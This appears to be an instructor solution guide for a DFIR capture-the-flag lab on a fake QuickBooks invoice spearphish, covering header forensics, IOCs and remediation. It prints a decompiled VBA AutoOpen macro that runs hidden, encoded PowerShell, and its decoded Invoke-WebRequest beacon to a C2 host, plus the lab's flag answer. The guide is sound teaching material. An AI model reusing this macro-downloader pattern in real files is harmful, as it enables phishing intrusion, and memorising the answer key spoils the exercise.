# 🎣 Instructor Solution Guide: Incident 0202 (Executive Spearphishing)

### Digital Forensics & Incident Response (DFIR) — Macro Downloader & C2 Analysis

---

## 📌 Executive Summary

| Parameter                           | Details                                                                                                                      |
| :---------------------------------- | :--------------------------------------------------------------------------------------------------------------------------- |
| **Incident ID**                     | `INC-0202-SPEARPHISH`                                                                                                        |
| **Target Workstation**              | `FIN-WS-1002` (Internal IP: `10.0.2.19`)                                                                                     |
| **Threat Classification**           | TLP:AMBER \| Severity: **HIGH**                                                                                              |
| **Primary MITRE ATT&CK Techniques** | **T1566.001** (Spearphishing Attachment), **T1204.002** (Malicious File), **T1059.005** (VBA), **T1071.001** (Web Protocols) |
| **Spoofed Identity**                | Intuit QuickBooks Billing (`quickbooks-invoicing-update.com`)                                                                |
| **Sender Mail Relay IP**            | `203.0.113.88`                                                                                                               |
| **Weaponized Attachment**           | `Invoice_Sept2026_OVERDUE.docm`                                                                                              |
| **Command and Control (C2) Domain** | `c2-exfil-node.darknet-routing.org` (`198.51.100.99`)                                                                        |
| **Recovered Incident Flag**         | `FLAG{dmarc_fail_invoice_c2_domain_detected}`                                                                                |

On September 10, 2026, an Accounts Payable specialist at `FIN-WS-1002` received a high-priority phishing email purporting to be an overdue QuickBooks invoice. Opening the macro-enabled Word document (`.docm`) triggered an automated VBA `AutoOpen` procedure that launched an encoded PowerShell downloader. The downloader contacted an external Command-and-Control node, leaking sensitive beacon headers and establishing an outbound egress channel.

---

## 🎯 Investigation Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo notebook or in your terminal environment:

### Step 1: Email Header & Sender Authentication Forensics

1. **Review Top KPI Indicators**:
   - In the top header cards of the Marimo notebook, observe:
     - **DMARC Verdict**: `FAIL (Spoofed)`
     - **DKIM Signature**: `FAIL`
     - **SPF Validation**: `SOFTFAIL`
     - **Macro Attachments**: `1 File(s)`
     - **Correlated DNS Lookups**: Active telemetry for host `10.0.2.19`
2. **Inspect RFC 822 Email Headers**:
   - Scroll to **Step 1: Email Header Forensics** and examine the headers table:
     - **From**: `Intuit Billing Alert <billing@quickbooks-invoicing-update.com>`
     - **To**: `accountspayable@corp.internal`
     - **Subject**: `URGENT: Outstanding Overdue Invoice #INV-2026-8891`
     - **X-Originating-IP**: `203.0.113.88`
     - **Authentication-Results**: `spf=softfail (sender IP 203.0.113.88); dkim=fail; dmarc=fail`
3. **Analyze Authentication Failure**:
   - Notice that the domain `quickbooks-invoicing-update.com` is a typosquatting domain impersonating QuickBooks.
   - Because the sender IP `203.0.113.88` is not authorized by the legitimate SPF record and the cryptographic DKIM signature failed verification, DMARC evaluated to `fail`.
   - _Key Analyst Insight_: A properly configured mail gateway set to `p=reject` would have quarantined this email at the perimeter.

---

### Step 2: Attachment Forensics & VBA Macro Dissection

1. **Examine Document Metadata**:
   - In **Step 2: Extracted Attachment & Decompiled Macro Dissection**, review the metadata:
     - **Filename**: `Invoice_Sept2026_OVERDUE.docm`
     - **File Size**: `1,842 bytes`
     - **SHA-256**: `e2d67b077a565a443dd4aa5905d419b457e53ef788a4dbdae330e7c5148679f2`
     - **File Type**: Microsoft Word Macro-Enabled Document (`.docm`)
2. **Decompile the Embedded Macro**:
   - Inspect the decompiled VBA code:

     ```vb
     Sub AutoOpen()
         Dim cmd As String
         cmd = "powershell -enc SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9"
         Shell(cmd, vbHide)
     End Sub
     ```

3. **Trace Execution Mechanism**:
   - The procedure `AutoOpen()` executes immediately upon opening the document when macros are enabled.
   - `Shell(cmd, vbHide)` launches `powershell.exe` in a hidden background window (`vbHide`).
   - The argument `-enc` specifies a Base64-encoded command string.

---

### Step 3: Interactive DFIR Decoder Tool

1. **Locate the Decoder Workbench**:
   - Scroll to **Step 3: Interactive DFIR Decoder Tool**.
   - The Base64 string from the macro is automatically loaded into the input box:
     `SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9`
2. **Select Encoding Mode**:
   - Keep the default `Encoding Format:` as **`UTF-8 / ASCII`**.
3. **Inspect the Decoded PowerShell Output**:
   ```powershell
   Invoke-WebRequest http://c2-exfil-node.darknet-routing.org/beacon -Header @{Key="FLAG{dmarc_fail_invoice_c2_domain_detected}"}
   ```
4. **Identify the Core Findings**:
   - **C2 Beacon URI**: `http://c2-exfil-node.darknet-routing.org/beacon`
   - **Exfiltration / Authentication Header**: `FLAG{dmarc_fail_invoice_c2_domain_detected}`

---

### Step 4: Correlated Host DNS Telemetry & C2 Analysis

1. **Cross-Reference Network DNS Logs**:
   - Scroll to **Step 4: Correlated Host DNS Telemetry & C2 Analysis**.
2. **Trace the Victim Host Queries**:
   - Observe that endpoint `FIN-WS-1002` (`10.0.2.19`) issued an `A` record DNS query for `c2-exfil-node.darknet-routing.org`.
   - **DNS Server**: `10.0.0.2` (Internal Active Directory DNS)
   - **Resolved C2 IP**: `198.51.100.99`
   - **Response Code**: `NOERROR`
   - This confirms that host `10.0.2.19` successfully resolved the C2 server address and initiated outbound HTTP communication.

---

### Step 5: Flag Verification & Submission

1. **Verify the Flag**:
   - In **Step 5: Verify Incident Flag & IOCs**, enter:
     `FLAG{dmarc_fail_invoice_c2_domain_detected}`
   - Confirm the green success banner: `🎉 FLAG VERIFIED CORRECT!`.
2. **Submit to Portal**:
   - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box to claim 100 points.

---

## 🐍 Standalone Python Forensics Script

To extract the attachment, decompile the macro, and decode the payload programmatically:

```python
import base64
import email
from email import policy
from pathlib import Path
import re

# Load email message
eml_file = Path("data/urgent_invoice.eml")
with open(eml_file, "rb") as f:
    msg = email.message_from_binary_file(f, policy=policy.default)

print(f"[+] From: {msg.get('From')}")
print(f"[+] Authentication-Results: {msg.get('Authentication-Results')}")

# Extract attachment and find base64 payload
for part in msg.iter_attachments():
    filename = part.get_filename()
    content = part.get_payload(decode=True).decode("utf-8", errors="ignore")
    print(f"[+] Attachment found: {filename}")

    b64_match = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", content)
    if b64_match:
        raw_b64 = b64_match.group(1)
        decoded = base64.b64decode(raw_b64).decode("utf-8", errors="ignore")
        print(f"[!] Decoded PowerShell Payload:\n{decoded}")
```

---

## 📋 Indicators of Compromise (IOCs)

| IOC Type                | Value                                                              | Context                                     |
| :---------------------- | :----------------------------------------------------------------- | :------------------------------------------ |
| **Spoofed Domain**      | `quickbooks-invoicing-update.com`                                  | Phishing sender domain impersonating Intuit |
| **Originating IP**      | `203.0.113.88`                                                     | Untrusted external SMTP relay server        |
| **Malicious File**      | `Invoice_Sept2026_OVERDUE.docm`                                    | Weaponized Word macro downloader            |
| **File Hash (SHA-256)** | `e2d67b077a565a443dd4aa5905d419b457e53ef788a4dbdae330e7c5148679f2` | Known malicious invoice document            |
| **C2 Domain**           | `c2-exfil-node.darknet-routing.org`                                | HTTP beacon receiver                        |
| **C2 IPv4**             | `198.51.100.99`                                                    | External C2 listener                        |

---

## 🛡️ Remediation & Incident Response Playbook

1. **Endpoint Isolation**:
   - Immediately disconnect `FIN-WS-1002` (`10.0.2.19`) from the local subnet to contain C2 beaconing.
2. **Email Gateway Purge**:
   - Execute an Exchange / Google Workspace Compliance Search to search and destroy all emails matching Message-ID, Subject, or sender domain `quickbooks-invoicing-update.com`.
3. **Perimeter DNS & Firewall Blocking**:
   - Sinkhole `c2-exfil-node.darknet-routing.org` on corporate recursive DNS resolvers.
   - Block IP `198.51.100.99` on egress firewalls.
4. **Group Policy Hardening**:
   - Deploy Microsoft Office Group Policy Object (GPO) enforcing: **"Block macros from running in Office files from the Internet"** (`VBA Macro Notification Settings -> Disable all without notification`).
   - Enforce strict DMARC rejection policies (`p=reject`) on inbound email inspection gateways.
